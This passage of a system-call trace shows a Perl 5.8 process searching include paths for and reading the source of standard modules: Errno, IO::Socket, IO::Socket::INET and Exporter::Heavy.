73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
12710 07:43:45.446529 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
12710 07:43:45.446981 _llseek(8, 5966, [5966], SEEK_SET) = 0
12710 07:43:45.446998 _llseek(8, 0, [5966], SEEK_CUR) = 0
12710 07:43:45.447008 close(8)          = 0
12710 07:43:45.447362 brk(0x827b000)    = 0x827b000
12710 07:43:45.447490 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
12710 07:43:45.447983 _llseek(6, 6698, [6698], SEEK_SET) = 0
12710 07:43:45.447999 _llseek(6, 0, [6698], SEEK_CUR) = 0
12710 07:43:45.448010 close(6)          = 0
12710 07:43:45.448029 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448044 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448059 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448072 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448087 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448100 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448158 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448188 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448203 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448215 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448230 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448248 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
12710 07:43:45.448284 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.448300 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.448311 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.448329 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12710 07:43:45.448694 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448711 stat64("/etc/perl/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448725 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448739 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448753 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448766 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448781 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448794 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448808 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448820 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448834 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448847 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbf8ee8ac) = -1 ENOENT (No such file or directory)
12710 07:43:45.448861 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbf8ee99c) = -1 ENOENT (No such file or directory)
12710 07:43:45.448875 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12710 07:43:45.448897 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12710 07:43:45.448912 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ee6b8) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.448923 _llseek(8, 0, [0], SEEK_CUR) = 0
12710 07:43:45.448941 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12710 07:43:45.449534 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12710 07:43:45.449741 brk(0x829c000)    = 0x829c000
12710 07:43:45.450127 read(8, "", 4096) = 0
12710 07:43:45.450144 close(8)          = 0
12710 07:43:45.451189 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12710 07:43:45.451613 _llseek(6, 6496, [6496], SEEK_SET) = 0
12710 07:43:45.451631 _llseek(6, 0, [6496], SEEK_CUR) = 0
12710 07:43:45.451642 close(6)          = 0
12710 07:43:45.451704 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451721 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451736 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451749 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451764 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451778 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451792 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451805 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451819 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451832 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbf8eed5c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451846 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbf8eee4c) = -1 ENOENT (No such file or directory)
12710 07:43:45.451860 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12710 07:43:45.451921 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12710 07:43:45.451937 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8eeb68) = -1 ENOTTY (Inappropriate ioctl for device)
12710 07:43:45.452681 _llseek(6, 0, [0], SEEK_CUR) = 0
12710 07:43:45.452712 brk(0x82bd000)    = 0x82bd000
